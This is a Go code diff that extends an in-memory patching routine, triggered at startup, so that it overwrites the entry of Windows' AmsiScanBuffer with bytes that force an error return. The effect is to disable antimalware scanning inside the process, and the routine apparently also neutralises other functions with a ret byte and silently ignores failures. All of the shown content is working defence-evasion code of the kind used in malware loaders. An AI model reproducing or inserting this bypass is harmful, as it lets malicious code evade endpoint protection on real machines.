@@ -23,7 +23,7 @@ func autoStartupPatch() {
 	patchFunctionEntry("amsi.dll", "AmsiScanBuffer")
 }
 
-// patchFunctionEntry writes 0xC3 (ret) at the entry point of the specified function.
+// patchFunctionEntry writes 0xC3 (ret) or 0x80070057 for AMSI at the entry point.
 // Silently returns on any error (DLL not loaded, function not found, etc.).
 func patchFunctionEntry(dllName, funcName string) {
 	dll, err := syscall.LoadDLL(dllName)
@@ -36,14 +36,23 @@ func patchFunctionEntry(dllName, funcName string) {
 	}
 
 	addr := proc.Addr()
+
+	patchBytes := []byte{0xC3}
+	if funcName == "AmsiScanBuffer" {
+		patchBytes = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3} // mov eax, 0x80070057; ret
+	}
+	patchLen := uintptr(len(patchBytes))
+
 	var oldProtect uint32
-	ret, _, _ := procVirtualProtAP.Call(addr, 1, 0x40, uintptr(unsafe.Pointer(&oldProtect)))
+	ret, _, _ := procVirtualProtAP.Call(addr, patchLen, 0x40, uintptr(unsafe.Pointer(&oldProtect)))
 	if ret == 0 {
 		return // VirtualProtect failed
 	}
 
-	*(*byte)(unsafe.Pointer(addr)) = 0xC3
+	for i := uintptr(0); i < patchLen; i++ {
+		*(*byte)(unsafe.Pointer(addr + i)) = patchBytes[i]
+	}
 
 	// Restore original protection
-	procVirtualProtAP.Call(addr, 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
+	procVirtualProtAP.Call(addr, patchLen, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
 }
